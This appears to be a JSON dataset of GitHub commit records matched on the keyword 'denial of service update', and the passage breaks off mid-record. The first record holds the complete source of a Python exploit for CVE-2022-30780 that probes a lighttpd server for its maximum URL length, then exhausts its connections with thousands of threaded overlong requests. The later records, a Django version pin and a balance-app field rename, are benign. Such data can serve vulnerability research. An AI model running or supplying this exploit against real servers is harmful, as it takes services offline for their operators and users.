{"https:\/\/github.com\/p0dalirius\/CVE-2022-30780-lighttpd-denial-of-service":{"de2c476b6a0317d9be74c742be857a8256db5d40":{"url":"https:\/\/api.github.com\/repos\/p0dalirius\/CVE-2022-30780-lighttpd-denial-of-service\/commits\/de2c476b6a0317d9be74c742be857a8256db5d40","html_url":"https:\/\/github.com\/p0dalirius\/CVE-2022-30780-lighttpd-denial-of-service\/commit\/de2c476b6a0317d9be74c742be857a8256db5d40","message":"Update CVE-2022-30780-lighttpd-denial-of-service.py","sha":"de2c476b6a0317d9be74c742be857a8256db5d40","keyword":"denial of service update","diff":"diff --git a\/CVE-2022-30780-lighttpd-denial-of-service.py b\/CVE-2022-30780-lighttpd-denial-of-service.py\nindex 64e4dae..a05440e 100755\n--- a\/CVE-2022-30780-lighttpd-denial-of-service.py\n+++ b\/CVE-2022-30780-lighttpd-denial-of-service.py\n@@ -140,7 +140,7 @@ def parseArgs():\n if __name__ == '__main__':\n     options = parseArgs()\n \n-    # https:\/\/redmine.lighttpd.net\/boards\/2\/topics\/4306\n+    # https:\/\/redmine.lighttpd.net\/issues\/3059\n     server_max_fds = 8192\n     server_max_connections = 8192\n \n@@ -177,4 +177,4 @@ def parseArgs():\n                 t = tp.submit(worker, options.url, max_url_len, monitor_data)\n                 monitor_data[\"tasks\"].append(t)\n \n-        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)\n\\ No newline at end of file\n+        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)\n","files":{"\/CVE-2022-30780-lighttpd-denial-of-service.py":{"changes":[{"diff":"\n                 t = tp.submit(worker, options.url, max_url_len, monitor_data)\n                 monitor_data[\"tasks\"].append(t)\n \n-        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)\n\\ No newline at end of file\n+        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)\n","add":1,"remove":1,"filename":"\/CVE-2022-30780-lighttpd-denial-of-service.py","badparts":["        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)"],"goodparts":["        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)"]}],"source":"\n import argparse import requests import time from concurrent.futures import ThreadPoolExecutor from enum import Enum class RequestStatus(Enum): OK=0 HTTP_200=200 HTTP_403=403 HTTP_404=404 HTTP_500=500 ReadTimeout=1001 ConnectTimeout=1002 ConnectionError=1003 def test(baseurl, lenght, timeout=1): try: length=lenght -(len(baseurl) +2) testurl=baseurl +'\/' +\".\"*length +\"\/\" r=requests.get(testurl, timeout=timeout) except requests.exceptions.ReadTimeout as e: return RequestStatus.ReadTimeout except requests.exceptions.ConnectTimeout as e: return RequestStatus.ConnectTimeout except requests.exceptions.ConnectionError as e: return RequestStatus.ConnectionError return RequestStatus.OK def dichotomic_search(url, timeout=1, verbose=False): print(\"[>] Performing dichotomic search to find maximum URL length...\") urllen, step=1000, 1000 normal_response=test(url, len(url), timeout=timeout) last_result=normal_response if last_result==normal_response: while step >=1 and 0 < urllen <=150000: result=test(url, urllen, timeout=timeout) if verbose: print(\" [>] Testing URL length %d,(%s=> %s)\" %(urllen, result.name, last_result.name)) if last_result==RequestStatus.OK: if result==RequestStatus.OK: urllen=urllen +step else: step=step\/\/2 urllen=urllen -step else: if result==normal_response: step=step\/\/2 urllen=urllen +step else: urllen=urllen -step last_result=result if urllen <=0 or urllen >=150000: print(\"[!] Could not determine maximum URL length.\") print(\"[!] Maybe we can't connect to this URL or this lighttpd is not vulnerable?\") return None else: print(\"[+] Found maximum URL length %d\" % urllen) return urllen else: print(\"[!] Could connect to this URL.(%s)\" % last_result) return None def worker(baseurl, max_url_len, monitor_data): try: length=(max_url_len +1) -(len(baseurl) +2) testurl=baseurl +'\/' +\".\"*length +\"\/\" monitor_data[\"sent\"]=monitor_data[\"sent\"] +1 r=requests.get(testurl, timeout=1) except requests.exceptions.ReadTimeout as e: monitor_data[\"ReadTimeout\"]=monitor_data[\"ReadTimeout\"] +1 return \"ReadTimeout\" except requests.exceptions.ConnectTimeout as e: monitor_data[\"ConnectTimeout\"]=monitor_data[\"ConnectTimeout\"] +1 return \"ConnectTimeout\" return None def monitor_thread(monitor_data): refresh_rate=0.5 dos_count=0 mon_last, mon_now=monitor_data.copy(), monitor_data.copy() while monitor_data[\"sent\"] < monitor_data[\"total\"] and dos_count <=3: mon_now=monitor_data.copy() diff_ct=(mon_now[\"ConnectTimeout\"] -mon_last[\"ConnectTimeout\"]) diff_rt=(mon_now[\"ReadTimeout\"] -mon_last[\"ReadTimeout\"]) if(diff_ct > 0) and(diff_rt==0): dos_count +=1 print(\"[monitoring](%04d\/%04d) %5.2f %% | Rate %3d req\/s | ConnectTimeout:%04d | ReadTimeout:%04d (sockets disabled, connection limit reached) \" %( mon_now[\"sent\"], mon_now[\"total\"], (mon_now[\"sent\"] \/ mon_now[\"total\"]) * 100, (mon_now[\"sent\"] -mon_last[\"sent\"]) * refresh_rate, mon_now[\"ConnectTimeout\"], mon_now[\"ReadTimeout\"]) ) else: dos_count=0 print(\"[monitoring](%04d\/%04d) %5.2f %% | Rate %3d req\/s | ConnectTimeout:%04d | ReadTimeout:%04d \" %( mon_now[\"sent\"], mon_now[\"total\"], (mon_now[\"sent\"] \/ mon_now[\"total\"]) * 100, (mon_now[\"sent\"] -mon_last[\"sent\"]) * refresh_rate, mon_now[\"ConnectTimeout\"], mon_now[\"ReadTimeout\"]) ) mon_last=mon_now time.sleep(refresh_rate) print() if dos_count > 3: for t in monitor_data[\"tasks\"]: t.cancel() def parseArgs(): parser=argparse.ArgumentParser(description=\"CVE-2022-30780-lighttpd-denial-of-service\") parser.add_argument(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose mode\") parser.add_argument(\"-u\", \"--url\", dest=\"url\", action=\"store\", type=str, required=True, help=\"URL to connect to.\") parser.add_argument(\"-k\", \"--insecure\", dest=\"insecure_tls\", action=\"store_true\", default=False, help=\"Allow insecure server connections when using SSL(default: False)\") parser.add_argument(\"-t\", \"--threads\", dest=\"threads\", action=\"store\", type=int, default=256, required=False, help=\"Number of threads(default: 20)\") return parser.parse_args() if __name__=='__main__': options=parseArgs() server_max_fds=8192 server_max_connections=8192 if not options.url.startswith(\"http:\/\/\") and not options.url.startswith(\"https:\/\/\"): options.url=\"https:\/\/\" +options.url options.url=options.url.rstrip('\/') if options.insecure_tls: requests.packages.urllib3.disable_warnings() requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS +=':HIGH:!DH:!aNULL' try: requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS +=':HIGH:!DH:!aNULL' except AttributeError: pass max_url_len=dichotomic_search(options.url, timeout=1, verbose=options.verbose) if max_url_len is not None: monitor_data={ \"total\": server_max_connections, \"sent\": 0, \"ReadTimeout\": 0, \"ConnectTimeout\": 0, \"tasks\":[] } with ThreadPoolExecutor(max_workers=min(options.threads, server_max_connections)) as tp: tp.submit(monitor_thread, monitor_data) for k in range(server_max_connections): t=tp.submit(worker, options.url, max_url_len, monitor_data) monitor_data[\"tasks\"].append(t) print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url) ","sourceWithComments":"#!\/usr\/bin\/env python3\n# -*- coding: utf-8 -*-\n# File name          : CVE-2022-30780-lighttpd-denial-of-service.py\n# Author             : Podalirius (@podalirius_)\n# Date created       : 17 July 2021\n\n\nimport argparse\nimport requests\nimport time\nfrom concurrent.futures import ThreadPoolExecutor\nfrom enum import Enum\n\n\nclass RequestStatus(Enum):\n    OK = 0\n    HTTP_200 = 200\n    HTTP_403 = 403\n    HTTP_404 = 404\n    HTTP_500 = 500\n    ReadTimeout = 1001\n    ConnectTimeout = 1002\n    ConnectionError = 1003\n\n\ndef test(baseurl, lenght, timeout=1):\n    try:\n        length = lenght - (len(baseurl) + 2)\n        testurl = baseurl + '\/' + \".\"*length + \"\/\"\n        r = requests.get(testurl, timeout=timeout)\n    except requests.exceptions.ReadTimeout as e:\n        return RequestStatus.ReadTimeout\n    except requests.exceptions.ConnectTimeout as e:\n        return RequestStatus.ConnectTimeout\n    except requests.exceptions.ConnectionError as e:\n        return RequestStatus.ConnectionError\n    return RequestStatus.OK\n\n\ndef dichotomic_search(url, timeout=1, verbose=False):\n    print(\"[>] Performing dichotomic search to find maximum URL length ...\")\n    urllen, step = 1000, 1000\n    normal_response = test(url, len(url), timeout=timeout)\n    last_result = normal_response\n    if last_result == normal_response:\n        while step >= 1 and 0 < urllen <= 150000:\n            result = test(url, urllen, timeout=timeout)\n            if verbose:\n                print(\"   [>] Testing URL length %d, (%s => %s)\" % (urllen, result.name, last_result.name))\n            if last_result == RequestStatus.OK:\n                if result == RequestStatus.OK:\n                    urllen = urllen + step\n                else:\n                    # Too long\n                    step = step\/\/2\n                    urllen = urllen - step\n            else:\n                if result == normal_response:\n                    step = step\/\/2\n                    urllen = urllen + step\n                else:\n                    # Too long\n                    urllen = urllen - step\n            last_result = result\n        if urllen <= 0 or urllen >= 150000:\n            print(\"[!] Could not determine maximum URL length.\")\n            print(\"[!] Maybe we can't connect to this URL or this lighttpd is not vulnerable?\")\n            return None\n        else:\n            print(\"[+] Found maximum URL length %d\" % urllen)\n            return urllen\n    else:\n        print(\"[!] Could connect to this URL. (%s)\" % last_result)\n        return None\n\n\ndef worker(baseurl, max_url_len, monitor_data):\n    try:\n        length = (max_url_len + 1) - (len(baseurl) + 2)\n        testurl = baseurl + '\/' + \".\"*length + \"\/\"\n        monitor_data[\"sent\"] = monitor_data[\"sent\"] + 1\n        r = requests.get(testurl, timeout=1)\n    except requests.exceptions.ReadTimeout as e:\n        monitor_data[\"ReadTimeout\"] = monitor_data[\"ReadTimeout\"] + 1\n        return \"ReadTimeout\"\n    except requests.exceptions.ConnectTimeout as e:\n        monitor_data[\"ConnectTimeout\"] = monitor_data[\"ConnectTimeout\"] + 1\n        return \"ConnectTimeout\"\n    return None\n\n\ndef monitor_thread(monitor_data):\n    refresh_rate = 0.5\n    dos_count = 0\n    mon_last, mon_now = monitor_data.copy(), monitor_data.copy()\n    while monitor_data[\"sent\"] < monitor_data[\"total\"] and dos_count <= 3:\n        mon_now = monitor_data.copy()\n        diff_ct = (mon_now[\"ConnectTimeout\"] - mon_last[\"ConnectTimeout\"])\n        diff_rt = (mon_now[\"ReadTimeout\"] - mon_last[\"ReadTimeout\"])\n        if (diff_ct > 0) and (diff_rt == 0):\n            # sockets disabled, connection limit reached\n            dos_count += 1\n            print(\"[monitoring] (%04d\/%04d) %5.2f %% | Rate %3d req\/s | ConnectTimeout:%04d | ReadTimeout:%04d  (sockets disabled, connection limit reached)  \" % (\n                mon_now[\"sent\"],\n                mon_now[\"total\"],\n                (mon_now[\"sent\"] \/ mon_now[\"total\"]) * 100,\n                (mon_now[\"sent\"] - mon_last[\"sent\"]) * refresh_rate,\n                mon_now[\"ConnectTimeout\"],\n                mon_now[\"ReadTimeout\"])\n            )\n        else:\n            dos_count = 0\n            print(\"[monitoring] (%04d\/%04d) %5.2f %% | Rate %3d req\/s | ConnectTimeout:%04d | ReadTimeout:%04d       \" % (\n                mon_now[\"sent\"],\n                mon_now[\"total\"],\n                (mon_now[\"sent\"] \/ mon_now[\"total\"]) * 100,\n                (mon_now[\"sent\"] - mon_last[\"sent\"]) * refresh_rate,\n                mon_now[\"ConnectTimeout\"],\n                mon_now[\"ReadTimeout\"])\n            )\n        mon_last = mon_now\n        time.sleep(refresh_rate)\n    print()\n\n    # If DoS, terminate all threads.\n    if dos_count > 3:\n        for t in monitor_data[\"tasks\"]:\n            t.cancel()\n\n\ndef parseArgs():\n    parser = argparse.ArgumentParser(description=\"CVE-2022-30780-lighttpd-denial-of-service\")\n    parser.add_argument(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False, help=\"Verbose mode\")\n    parser.add_argument(\"-u\", \"--url\", dest=\"url\", action=\"store\", type=str, required=True, help=\"URL to connect to.\")\n    parser.add_argument(\"-k\", \"--insecure\", dest=\"insecure_tls\", action=\"store_true\", default=False, help=\"Allow insecure server connections when using SSL (default: False)\")\n    parser.add_argument(\"-t\", \"--threads\", dest=\"threads\", action=\"store\", type=int, default=256, required=False, help=\"Number of threads (default: 20)\")\n    return parser.parse_args()\n\n\nif __name__ == '__main__':\n    options = parseArgs()\n\n    # https:\/\/redmine.lighttpd.net\/boards\/2\/topics\/4306\n    server_max_fds = 8192\n    server_max_connections = 8192\n\n    if not options.url.startswith(\"http:\/\/\") and not options.url.startswith(\"https:\/\/\"):\n        options.url = \"https:\/\/\" + options.url\n    options.url = options.url.rstrip('\/')\n\n    if options.insecure_tls:\n        # Disable warings of insecure connection for invalid certificates\n        requests.packages.urllib3.disable_warnings()\n        # Allow use of deprecated and weak cipher methods\n        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'\n        try:\n            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'\n        except AttributeError:\n            pass\n\n    # Detecting maximum URL length\n    max_url_len = dichotomic_search(options.url, timeout=1, verbose=options.verbose)\n\n    if max_url_len is not None:\n        monitor_data = {\n            \"total\": server_max_connections,\n            \"sent\": 0,\n            \"ReadTimeout\": 0,\n            \"ConnectTimeout\": 0,\n            \"tasks\": []\n        }\n\n        # Waits for all the threads to be completed\n        with ThreadPoolExecutor(max_workers=min(options.threads, server_max_connections)) as tp:\n            tp.submit(monitor_thread, monitor_data)\n            for k in range(server_max_connections):\n                t = tp.submit(worker, options.url, max_url_len, monitor_data)\n                monitor_data[\"tasks\"].append(t)\n\n        print(\"[>] All done! Remote server at %s should not be responding anymore.\" % options.url)"}},"msg":"Update CVE-2022-30780-lighttpd-denial-of-service.py"}},"https:\/\/github.com\/Klimaat-Helpdesk\/wagtail-helpdesk":{"f8c8aebd3e0c3058c29b419a43f60adb508da6fb":{"url":"https:\/\/api.github.com\/repos\/Klimaat-Helpdesk\/wagtail-helpdesk\/commits\/f8c8aebd3e0c3058c29b419a43f60adb508da6fb","html_url":"https:\/\/github.com\/Klimaat-Helpdesk\/wagtail-helpdesk\/commit\/f8c8aebd3e0c3058c29b419a43f60adb508da6fb","message":"Update pinning to resolve dependabot warning about vulnerable Django\n\nQuote:\nIn Django 3.2 before 3.2.17, 4.0 before 4.0.9, and 4.1 before 4.1.6, the parsed values of Accept-Language headers are cached in order to avoid repetitive parsing. This leads to a potential denial-of-service vector via excessive memory usage if the raw value of Accept-Language headers is very large.\n\nSee: https:\/\/github.com\/Klimaat-Helpdesk\/wagtail-helpdesk\/security\/dependabot\/2","sha":"f8c8aebd3e0c3058c29b419a43f60adb508da6fb","keyword":"denial of service update","diff":"diff --git a\/setup.py b\/setup.py\nindex 1ed6170..adebd93 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -41,7 +41,7 @@\n         \"Framework :: Wagtail :: 4.1\",\n     ],\n     install_requires=[\n-        \"Django>=3.2,<4.0\",\n+        \"Django>=3.2.18,<4.0\",\n         \"Wagtail>=3.0,<4.2\",\n         \"django-allauth>=0.44,<1.0\",\n         \"django-crispy-forms>=1.0,<2.0\",\n","files":{"\/setup.py":{"changes":[{"diff":"\n         \"Framework :: Wagtail :: 4.1\",\n     ],\n     install_requires=[\n-        \"Django>=3.2,<4.0\",\n+        \"Django>=3.2.18,<4.0\",\n         \"Wagtail>=3.0,<4.2\",\n         \"django-allauth>=0.44,<1.0\",\n         \"django-crispy-forms>=1.0,<2.0\",\n","add":1,"remove":1,"filename":"\/setup.py","badparts":["        \"Django>=3.2,<4.0\","],"goodparts":["        \"Django>=3.2.18,<4.0\","]}],"source":"\n from os import path from setuptools import find_packages, setup from wagtail_helpdesk import __version__ this_directory=path.abspath(path.dirname(__file__)) with open(path.join(this_directory, \"README.md\"), encoding=\"utf-8\") as f: long_description=f.read() setup( name=\"wagtail-helpdesk\", version=__version__, description=\"A Wagtail app aimed at answering questions by experts\", long_description=long_description, long_description_content_type=\"text\/markdown\", author=\"Four Digits\", author_email=\"info@fourdigits.nl\", url=\"\", packages=find_packages(), include_package_data=True, license=\"BSD\", python_requires=\">=3.9\", classifiers=[ \"Development Status:: 3 -Alpha\", \"Intended Audience:: Developers\", \"License:: OSI Approved:: BSD License\", \"Operating System:: OS Independent\", \"Programming Language:: Python\", \"Programming Language:: Python:: 3\", \"Programming Language:: Python:: 3.9\", \"Programming Language:: Python:: 3.10\", \"Programming Language:: Python:: 3.11\", \"Framework:: Django\", \"Framework:: Django:: 3.2\", \"Framework:: Wagtail\", \"Framework:: Wagtail:: 3\", \"Framework:: Wagtail:: 4\", \"Framework:: Wagtail:: 4.1\", ], install_requires=[ \"Django>=3.2,<4.0\", \"Wagtail>=3.0,<4.2\", \"django-allauth>=0.44,<1.0\", \"django-crispy-forms>=1.0,<2.0\", \"argon2-cffi>=21.0,<22.0\", ], extras_require={ \"testing\":[ \"dj-database-url>=1,<2\", \"pytest>=7,<8\", \"factory-boy>=3,<4\", \"pytest-django>=4,<5\", \"pytest-cov>=4,<5\", \"wagtail-factories>=3,<4\", \"django-webtest>=1,<2\", ], }, zip_safe=False, ) ","sourceWithComments":"#!\/usr\/bin\/env python\n\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\nfrom wagtail_helpdesk import __version__\n\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, \"README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"wagtail-helpdesk\",\n    version=__version__,\n    description=\"A Wagtail app aimed at answering questions by experts\",\n    long_description=long_description,\n    long_description_content_type=\"text\/markdown\",\n    author=\"Four Digits\",\n    author_email=\"info@fourdigits.nl\",\n    url=\"\",\n    packages=find_packages(),\n    include_package_data=True,\n    license=\"BSD\",\n    python_requires=\">=3.9\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Wagtail\",\n        \"Framework :: Wagtail :: 3\",\n        \"Framework :: Wagtail :: 4\",\n        \"Framework :: Wagtail :: 4.1\",\n    ],\n    install_requires=[\n        \"Django>=3.2,<4.0\",\n        \"Wagtail>=3.0,<4.2\",\n        \"django-allauth>=0.44,<1.0\",\n        \"django-crispy-forms>=1.0,<2.0\",\n        \"argon2-cffi>=21.0,<22.0\",\n    ],\n    extras_require={\n        \"testing\": [\n            \"dj-database-url>=1,<2\",\n            \"pytest>=7,<8\",\n            \"factory-boy>=3,<4\",\n            \"pytest-django>=4,<5\",\n            \"pytest-cov>=4,<5\",\n            \"wagtail-factories>=3,<4\",\n            \"django-webtest>=1,<2\",\n        ],\n    },\n    zip_safe=False,\n)\n"}},"msg":"Update pinning to resolve dependabot warning about vulnerable Django\n\nQuote:\nIn Django 3.2 before 3.2.17, 4.0 before 4.0.9, and 4.1 before 4.1.6, the parsed values of Accept-Language headers are cached in order to avoid repetitive parsing. This leads to a potential denial-of-service vector via excessive memory usage if the raw value of Accept-Language headers is very large.\n\nSee: https:\/\/github.com\/Klimaat-Helpdesk\/wagtail-helpdesk\/security\/dependabot\/2"}},"https:\/\/github.com\/fabbo-repo\/balance-home-app":{"e3fd1a6d9440bbf578f10fea6c19aaaa75623829":{"url":"https:\/\/api.github.com\/repos\/fabbo-repo\/balance-home-app\/commits\/e3fd1a6d9440bbf578f10fea6c19aaaa75623829","html_url":"https:\/\/github.com\/fabbo-repo\/balance-home-app\/commit\/e3fd1a6d9440bbf578f10fea6c19aaaa75623829","sha":"e3fd1a6d9440bbf578f10fea6c19aaaa75623829","keyword":"denial of service update","diff":"diff --git a\/backend\/djangorest\/balance\/admin.py b\/backend\/djangorest\/balance\/admin.py\nindex 2da710f..113940b 100644\n--- a\/backend\/djangorest\/balance\/admin.py\n+++ b\/backend\/djangorest\/balance\/admin.py\n@@ -8,7 +8,7 @@ class AnnualBalanceAdmin(admin.ModelAdmin):\n     fields = (\n         'id',\n         'year',\n-        ('gross_quantity', 'net_quantity',),\n+        ('gross_quantity', 'expected_quantity',),\n         'coin_type',\n         'owner',\n         'created',\n@@ -26,7 +26,7 @@ class MonthlyBalanceAdmin(admin.ModelAdmin):\n     fields = (\n         'id',\n         ('month', 'year',),\n-        ('gross_quantity', 'net_quantity',),\n+        ('gross_quantity', 'expected_quantity',),\n         'coin_type',\n         'owner',\n         'created',\ndiff --git a\/backend\/djangorest\/balance\/api\/filter.py b\/backend\/djangorest\/balance\/api\/filter.py\nindex 0994351..efd0525 100644\n--- a\/backend\/djangorest\/balance\/api\/filter.py\n+++ b\/backend\/djangorest\/balance\/api\/filter.py\n@@ -13,15 +13,15 @@ class AnnualBalanceFilterSet(filters.FilterSet):\n         lookup_expr = \"lte\",\n         label = \"Max gross quantity\"\n     )\n-    net_quantity_min = filters.NumberFilter(\n-        field_name = \"net_quantity\",\n+    expected_quantity_min = filters.NumberFilter(\n+        field_name = \"expected_quantity\",\n         lookup_expr = \"gte\",\n-        label = \"Min net quantity\"\n+        label = \"Min expected quantity\"\n     )\n-    net_quantity_max = filters.NumberFilter(\n-        field_name = \"net_quantity\",\n+    expected_quantity_max = filters.NumberFilter(\n+        field_name = \"expected_quantity\",\n         lookup_expr = \"lte\",\n-        label = \"Max net quantity\"\n+        label = \"Max expected quantity\"\n     )\n     \n     class Meta:\ndiff --git a\/backend\/djangorest\/balance\/api\/serializers.py b\/backend\/djangorest\/balance\/api\/serializers.py\nindex 426f09d..cac3c40 100644\n--- a\/backend\/djangorest\/balance\/api\/serializers.py\n+++ b\/backend\/djangorest\/balance\/api\/serializers.py\n@@ -8,7 +8,7 @@ class Meta:\n         model = AnnualBalance\n         fields = [\n             'gross_quantity',\n-            'net_quantity',\n+            'expected_quantity',\n             'coin_type',\n             'year',\n             'created'\n@@ -20,7 +20,7 @@ class Meta:\n         model = MonthlyBalance\n         fields = [\n             'gross_quantity',\n-            'net_quantity',\n+            'expected_quantity',\n             'coin_type',\n             'year',\n             'month',\ndiff --git a\/backend\/djangorest\/balance\/migrations\/0001_initial.py b\/backend\/djangorest\/balance\/migrations\/0001_initial.py\nindex ba1fac6..a875574 100644\n--- a\/backend\/djangorest\/balance\/migrations\/0001_initial.py\n+++ b\/backend\/djangorest\/balance\/migrations\/0001_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n import django.core.validators\n from django.db import migrations, models\n@@ -20,7 +20,7 @@ class Migration(migrations.Migration):\n             fields=[\n                 ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                 ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n-                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n+                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\n                 ('updated', models.DateTimeField(auto_now_add=True)),\n                 ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')),\n@@ -37,7 +37,7 @@ class Migration(migrations.Migration):\n             fields=[\n                 ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                 ('gross_quantity', models.FloatField(default=0, verbose_name='gross quantity')),\n-                ('net_quantity', models.FloatField(default=0, verbose_name='net quantity')),\n+                ('expected_quantity', models.FloatField(default=0, verbose_name='expected quantity')),\n                 ('created', models.DateTimeField(auto_now_add=True)),\n                 ('updated', models.DateTimeField(auto_now_add=True)),\n                 ('year', models.PositiveIntegerField(validators=[django.core.validators.MinValueValidator(1), django.core.validators.MaxValueValidator(5000)], verbose_name='year')),\ndiff --git a\/backend\/djangorest\/balance\/migrations\/0002_initial.py b\/backend\/djangorest\/balance\/migrations\/0002_initial.py\nindex ed10612..a4cd643 100644\n--- a\/backend\/djangorest\/balance\/migrations\/0002_initial.py\n+++ b\/backend\/djangorest\/balance\/migrations\/0002_initial.py\n@@ -1,4 +1,4 @@\n-# Generated by Django 4.0.7 on 2022-10-22 21:39\n+# Generated by Django 4.0.8 on 2022-12-08 11:56\n \n from django.conf import settings\n from django.db import migrations, models\n@@ -10,9 +10,9 @@ class Migration(migrations.Migration):\n     initial = True\n \n     dependencies = [\n-        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n         ('coin', '0001_initial'),\n         ('balance', '0001_initial'),\n+        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n     ]\n \n     operations = [\ndiff --git a\/backend\/djangorest\/balance\/models.py b\/backend\/djangorest\/balance\/models.py\nindex 0331a98..85806f7 100644\n--- a\/backend\/djangorest\/balance\/models.py\n+++ b\/backend\/djangorest\/balance\/models.py\n@@ -18,6 +18,7 @@ class Balance(models.Model):\n     )\n     description = models.CharField(\n         verbose_name = _('description'),\n+        blank=True,\n         max_length = 2000, \n         default = \"\"\n     )\n@@ -63,9 +64,9 @@ class DateBalance(models.Model):\n         verbose_name = _('gross quantity'),\n         default = 0\n     )\n-    # expected_quantity - gross_quantity\n-    net_quantity = models.FloatField(\n-        verbose_name = _('net quantity'),\n+    # expected_quantity\n+    expected_quantity = models.FloatField(\n+        verbose_name = _('expected quantity'),\n         default = 0\n     )\n     coin_type = models.ForeignKey(\ndiff --git a\/backend\/djangorest\/balance\/tasks.py b\/backend\/djangorest\/balance\/tasks.py\nindex 630e489..c207513 100644\n--- a\/backend\/djangorest\/balance\/tasks.py\n+++ b\/backend\/djangorest\/balance\/tasks.py\n@@ -24,8 +24,7 @@ def send_monthly_balance(user, month, year):\n             user.pref_coin_type,\n             monthly_balance.gross_quantity\n         )\n-    monthly_balance.net_quantity = round(user.expected_monthly_balance \\\n-        - monthly_balance.gross_quantity, 2)\n+    monthly_balance.expected_quantity = round(user.expected_monthly_balance, 2)\n     monthly_balance.save()\n     # Email sent\n     notifications.send_monthly_balance(\n@@ -34,7 +33,7 @@ def send_monthly_balance(user, month, year):\n         year,\n         monthly_balance.gross_quantity,\n         user.expected_monthly_balance,\n-        monthly_balance.net_quantity,\n+        monthly_balance.expected_quantity,\n         user.language\n     )\n \n@@ -53,8 +52,7 @@ def send_annual_balance(user, year):\n             user.pref_coin_type,\n             annual_balance.gross_quantity\n         )\n-    annual_balance.net_quantity = round(user.expected_annual_balance \\\n-        - annual_balance.gross_quantity, 2)\n+    annual_balance.expected_quantity = round(user.expected_annual_balance, 2)\n     annual_balance.save()\n     # Email sent\n     notifications.send_annual_balance(\n@@ -62,7 +60,7 @@ def send_annual_balance(user, year):\n         year,\n         annual_balance.gross_quantity,\n         user.expected_annual_balance,\n-        annual_balance.net_quantity,\n+        annual_balance.expected_quantity,\n         user.language\n     )\n \ndiff --git a\/backend\/djangorest\/balance\/tests\/test_date_balance.py b\/backend\/djangorest\/balance\/tests\/test_date_balance.py\nindex 63692c5..7a8a7e2 100644\n--- a\/backend\/djangorest\/balance\/tests\/test_date_balance.py\n+++ b\/backend\/djangorest\/balance\/tests\/test_date_balance.py\n@@ -30,7 +30,9 @@ def setUp(self):\n             \"password\": \"password1@212\",\n             \"password2\": \"password1@212\",\n             'inv_code': str(self.inv_code.code),\n-            'pref_coin_type': str(self.coin_type.code)\n+            'pref_coin_type': str(self.coin_type.code),\n+            \"expected_annual_balance\": 10.0,\n+            \"expected_monthly_balance\": 10.0\n         }\n         self.credentials = {\n             'email':\"email1@test.com\",\n@@ -42,7 +44,9 @@ def setUp(self):\n             email=self.user_data[\"email\"],\n             inv_code=self.inv_code,\n             verified=True,\n-            pref_coin_type=self.coin_type\n+            pref_coin_type=self.coin_type,\n+            expected_annual_balance=self.user_data[\"expected_annual_balance\"],\n+            expected_monthly_balance=self.user_data[\"expected_monthly_balance\"]\n         )\n         user.set_password(self.user_data['password'])\n         user.save()\n@@ -109,9 +113,11 @@ def test_revenue_post_date_balances(self):\n         self.assertEqual(now().date().year, last_monthly_balance.year)\n         self.assertEqual(now().date().month, last_monthly_balance.month)\n         self.assertEqual(data['quantity'], last_monthly_balance.gross_quantity)\n+        self.assertEqual(10.0, last_monthly_balance.expected_quantity)\n         last_annual_balance = AnnualBalance.objects.last()\n         self.assertEqual(now().date().year, last_annual_balance.year)\n         self.assertEqual(data['quantity'], last_annual_balance.gross_quantity)\n+        self.assertEqual(10.0, last_annual_balance.expected_quantity)\n \n     def test_expense_post_date_balances(self):\n         \"\"\"\n@@ -128,9 +134,11 @@ def test_expense_post_date_balances(self):\n         self.assertEqual(now().date().year, last_monthly_balance.year)\n         self.assertEqual(now().date().month, last_monthly_balance.month)\n         self.assertEqual(-data['quantity'], last_monthly_balance.gross_quantity)\n+        self.assertEqual(10.0, last_monthly_balance.expected_quantity)\n         last_annual_balance = AnnualBalance.objects.last()\n         self.assertEqual(now().date().year, last_annual_balance.year)\n         self.assertEqual(-data['quantity'], last_annual_balance.gross_quantity)\n+        self.assertEqual(10.0, last_annual_balance.expected_quantity)\n     \n     def test_revenue_delete_date_balances(self):\n         \"\"\"\ndiff --git a\/backend\/djangorest\/balance\/tests\/test_filter.py b\/backend\/djangorest\/balance\/tests\/test_filter.py\nindex 94f8087..edb5220 100644\n--- a\/backend\/djangorest\/balance\/tests\/test_filter.py\n+++ b\/backend\/djangorest\/balance\/tests\/test_filter.py\n@@ -51,7 +51,7 @@ def authenticate_user(self, credentials):\n     def get_annual_balance_data(self):\n 